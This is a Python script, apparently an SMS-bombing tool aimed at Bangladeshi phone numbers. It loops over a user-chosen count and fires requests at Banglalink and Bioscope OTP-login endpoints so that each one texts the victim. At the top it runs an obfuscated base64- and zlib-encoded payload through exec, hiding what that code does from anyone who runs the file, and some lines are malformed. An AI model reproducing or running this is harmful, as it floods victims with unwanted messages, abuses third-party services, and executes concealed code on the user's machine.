import marshal,zlib,base64
exec(zlib.decompress(base64.b64decode("eJyNU72OEzEQ7v0UIxdoV5fsD6I4Ii0IBBIN1+S6U4ScZJJY7NqOPXuAoki8AwUNFa/Cm/Ak+Gc3x4orcGPPzDfffB6PZWe0JbB47NGRA+HAHplMXpIdMqb6bo0WoAFHNpPK9JTxuxcreKvI+28PCK/fwE1ELYDnOROd7hX5BKno8YRXXYQkOHOoaAYqbD6pmkHF2E5b2EQaqcAKtcesnsHAfAV1vmAAZL+EDbwyQb0LydGUO0iqCx+w5D5JOmS8qp/xHDzvo7HnPE9cANYT2WNhtPPCD0TGLcpSOIfUSkJhZLH2glrRSvWxUEild5X3ddk7tKUmM2/1XqpyaCqfwVaQaE6802vZIl8MAs75UO+iPmryxw8bvcUhCBAP2Doc9fW29eDdRZpP2mOxltpttMFW3mOx0V2JqkxCfGO3c6/rpTlohc319WkQ8MTDrSBtm3UE8GkD9kiZr/UfMseuj5AGnlbVKNfYMAc7fvf7x7cVnOKrnmH5fglL/+IFT/xh2ArXIpqsTp44D1cN1NFKwxBNb+PnDRr6p8Kv79MCN5omRaZlqtEZM66ayPxQB/5ebGKQJtEeJIVfkWaSpfENq4FLeB4vwdhDC77+XMFtCMM76f/bAk4j+Ow1TluVcEF/wAWmCSZcNkHGawaYGnB/AL+tMQk=")))import requests as rq

import time

number  = str(input("[>] Enter The BD Number: "))

amount = int(input("[>] Enter The Ammount: "))

sent, nsent = 0, 0

for count in range(1, amount + 1):

  try:

    status = 0

    if number.startswith("014") or number.startswith("019"):

      r = rq.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request", data={"mobile": number})

      status = r.status_code

        

    else:

      url = f"https://stage.bioscopelive.com/en/login/send-otp?phone=88{number}&operator=bd-otp"

      r = rq.get(url)

      status = r.status_code

    

    if status == 200:

      print(f"[✓] {count} SMS Sent.")

    time.sleep(1)

    sent += 1

    count += 1

  except:

      print(f"[×] {count} SMS Not Sent.")

      time.sleep(10)

      count+=1

  count += 1             

            

totalhit  = amount

nsent     = totalhit - sent

print(f"[•] Total Hits : {totalhit}")

print(f"[✓] Total Sent : {sent}")

print(f"[×] Total Not Sent : {nsent}")
